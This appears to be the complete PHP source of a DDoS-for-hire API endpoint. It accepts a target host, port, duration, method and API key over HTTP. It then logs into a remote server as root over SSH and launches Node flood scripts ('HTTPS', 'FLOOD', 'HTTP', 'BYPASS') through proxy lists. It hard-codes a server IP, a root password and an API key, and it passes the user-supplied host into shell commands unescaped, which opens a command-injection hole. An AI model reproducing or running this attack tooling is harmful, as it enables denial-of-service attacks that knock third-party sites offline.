<?php
    include('Net/SSH2.php');

    $address = "116.103.229.134"; //Server IP (If same server use localhost)

    $serverPort = 22; //SSH port (Default 22)
    
    $user = "root"; //User for the server
    
    $password = "haibedz"; //Password for the server
    
    $Methods = array("HTTPS", "FLOOD", "HTTP", "BYPASS"); //Array of methods

    $APIKey = "noxbabimilk"; //Your API Key

    $host = $_GET["host"];
    $port = intval($_GET['port']);
    $time = intval($_GET['time']);
    $method = $_GET["method"];

    $key = $_GET["key"];

    if (empty($host) | empty($port) | empty($time) | empty($method)) //Checking the fields
    {
        die("Please verify all fields");
    }

    if (!is_numeric($port) || !is_numeric($time)) 
    {
        die('Time and Port must be a number');
    }
  
    if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL)) //Validating target
    {
        die('Host Phai La IP V4 - URL !');
    }

    if($port < 1 && $port > 65535) //Validating port
    {
        die("Vui Long Nhap Port");
    }

    if ($time < 1) //Validating time
    {
        die("Vui Long Nhap Time");
    }

    if (!in_array($method, $Methods)) //Validating method
    {
        die("Vui Long Nhap Host");
    }
    
    if ($key !== $APIKey) //Validating API Key
    { 
        die("Key Khong Co Trong He Thong");
    }

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password))
    {
        if($method == "HTTPS"){if(ssh2_exec($connection, "screen -dm timeout $time node HTTPS.js $host $time 64 6 GET proxy.txt")){echo "{[<br>
        'Status': 'Success Attack Sent'<br>
            'Host': $host<br>
            'Port': 443<br>
            'Time': $time Seconds<br>
            'Method': $method<br>
            'Senter By':root [owenr nox]
            'Admin API': 'Nox Babimilk | Chanel : t.me/noxbabimilk'<br>
            <br>}]";}
    else{die("Ran into a error");}}
        if($method == "FLOOD"){if(ssh2_exec($connection, "screen -dm timeout $time node FLOOD.js $host $time 64 5 proxy.txt")){echo "{[<br>
        'Status': 'Success Attack Sent'<br>
            'Host': $host<br>
            'Port': 443<br>
            'Time': $time Seconds<br>
            'Method': $method<br>
            'Senter By':root [owenr nox]
            'Admin API': 'Nox Babimilk | Chanel : t.me/noxbabimilk'<br>
            <br>}]";}
    else{die("Ran into a error");}}
        if($method == "HTTP"){if(ssh2_exec($connection, "screen -dm timeout $time node HTTP.js $host 64 7 $time")){echo "{[<br>
        'Status': 'Success Attack Sent'<br>
            'Host': $host<br>
            'Port': 443<br>
            'Time': $time Seconds<br>
            'Method': $method<br>
            'Senter By':root [owenr nox]
            'Admin API': 'Nox Babimilk | Chanel : t.me/noxbabimilk'<br>
            <br>}]";}
    else{die("Ran into a error");}}
        if($method == "BYPASS"){if(ssh2_exec($connection, "screen -dm timeout $time node BYPASS.js $host $time 64 7 proxy.txt")){echo "{[<br>
        'Status': 'Success Attack Sent'<br>
            'Host': $host<br>
            'Port': 443<br>
            'Time': $time Seconds<br>
            'Method': $method<br>
            'Senter By':root [owenr nox]
            'Admin API': 'Nox Babimilk | Chanel : t.me/noxbabimilk'<br>
            <br>}]";}
    else{die("Ran into a error");}}
    }
    else
    {
        die("Could not login to remote server, this may be a error with the login credentials.");
    }
?>
